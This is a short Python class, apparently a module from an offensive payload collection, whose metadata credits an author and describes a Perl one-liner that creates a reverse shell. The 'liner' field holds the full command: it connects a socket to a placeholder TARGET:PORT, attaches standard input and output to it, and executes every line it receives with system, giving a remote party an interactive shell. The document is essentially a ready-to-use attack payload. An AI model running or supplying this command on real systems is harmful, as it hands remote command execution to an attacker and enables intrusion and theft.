class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses perl to create a reverse shell"
    function    = "reverse shell"
    liner       = """perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"TARGET:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
